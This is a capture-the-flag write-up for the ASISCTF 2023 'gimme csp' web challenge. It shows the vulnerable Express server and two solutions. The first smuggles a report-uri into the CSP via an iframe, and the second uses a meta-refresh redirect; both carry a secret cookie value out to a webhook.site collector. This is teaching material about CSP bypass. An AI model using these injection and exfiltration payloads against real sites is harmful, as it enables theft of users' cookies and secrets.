---
title: gimme csp
date: 2024-01-08
tags: 
- web
- csp
- author-hartmannsyg
categories: ASISCTF 2023
---

written by {% person hartmannsyg %}

This was the *warm-up* web challenge of ASISCTF 2023 **finals**, but personally I found this to be quite hard. I didn't solve this in time but I'll just write the solution here anyways.

> hint for beginners: read about CSPs and iframes and what features they can offer that you can use to *bypass* or *exfiltrate* things. The challenge isn't easy if you are new to CTFs or don't have much experience however it *should* be the easiest web challenge.

{% ccb %}
website: https://gimmecsp.asisctf.com
Admin bot: http://18.195.96.13:8001
{% endccb %}

## Intended Solution - csp violation report

The website code is as follows:
{% ccb lang:js gutter1:1-21 caption:index.js highlight:9 %}
const express = require('express')
const cookieParser = require('cookie-parser')

const app = express()
app.use(cookieParser())
app.use((req,res,next)=>{
	res.header(
		'Content-Security-Policy',
		[`default-src 'none';`, ...[(req.headers['sec-required-csp'] ?? '').replaceAll('script-src','')]] 
	)
	if(req.headers['referer']) return res.type('text/plain').send('You have a typo in your http request')
	next()
})

app.get('/',(req,res)=>{
	let gift = req.cookies.gift ?? 'ASIS{test-flag}'
	let letter = (req.query.letter ?? `You were a good kid in 2023 so here's a gift for ya: $gift$`).toString()
	res.send(`<pre>${letter.replace('$gift$',gift)}</pre>`)
})

app.listen(8000)
{% endccb %}

Firstly, you are simply able to inject html into https://gimmecsp.asisctf.com site. 

E.g. `https://gimmecsp.asisctf.com/?letter=<h1>a</h1>` gives

```html
<pre><h1>a</h1></pre>
```

`https://gimmecsp.asisctf.com/` has:
{% ccb %}
Content-Security-Policy: default-src 'none';
{% endccb %}
so it seems virtually impregnable. However, in the highlighted line in the above code box, we see that the `sec-required-csp` headers get stripped of all `script-src`, which allows us to sneak in some csp.

Normally, in a iframe, it is [impossible to specify the `report-uri` or `report-to` csps](https://w3c.github.io/webappsec-cspee/#csp-attribute). However, if we do something sneaky like:
{% ccb html:true %}
rep<span class='keyword'>script-src</span>ort-uri
    ⬇️
report-uri
{% endccb %}

so we can craft a payload that sneaks in the report-uri:

{% ccb lang:html wrapped:true %}
<iframe referrerpolicy="no-referrer" src='https://gimmecsp.asisctf.com/?letter=<img src="$gift$">' csp="default-src 'none'; repscript-srcort-uri https://webhook.site/<hook>"></iframe>
{% endccb %}

The CSP then becomes:
{% ccb %}
Content-Security-Policy: default-src 'none'; report-uri https://webhook.site/<hook>
{% endccb %}

The report-uri *reports* any violation of csp to the specified url. In this case, we are violating csp by accessing `/$gift`, which is processed to `/ASIS{test-flag}` or to the real flag on the admin bot. So we will receive 

We then host a html document that has the following payload, report it to the admin bot and in our webhook we get:
{% ccb lang:json gutter1:1-15 highlight:9 %}
{
  "csp-report": {
    "document-uri": "https://gimmecsp.asisctf.com/?letter=%3C/pre%3E%3Cimg%20src=%22$gift$%22%3E",
    "referrer": "",
    "violated-directive": "img-src",
    "effective-directive": "img-src",
    "original-policy": "default-src 'none'; report-uri https://webhook.site/<hook>",
    "disposition": "enforce",
    "blocked-uri": "https://gimmecsp.asisctf.com/ASIS%7B1m-n07-r34dy-f0r-2024-y3t-dfadb%7D",
    "line-number": 1,
    "source-file": "https://gimmecsp.asisctf.com/",
    "status-code": 200,
    "script-sample": ""
  }
}
{% endccb %}

the flag is `ASIS{1m-n07-r34dy-f0r-2024-y3t-dfadb}`

## `<meta>` redirect solution

CSPs cannot block meta redirects, so submitting something like `https://gimmecsp.asisctf.com/?letter=<meta http-equiv="refresh" content="0; url=https://webhook.site/<hook>/$gift$">` will create the following html:

```html
<pre><meta http-equiv="refresh" content="0; url=https://webhook.site/<hook>/ASIS{test-flag}"></pre>
```

and redirect to `https://webhook.site/<hook>/ASIS{test-flag}`, giving us the flag (the `test-flag` will be replaced with the real flag when submitted to the admin bot)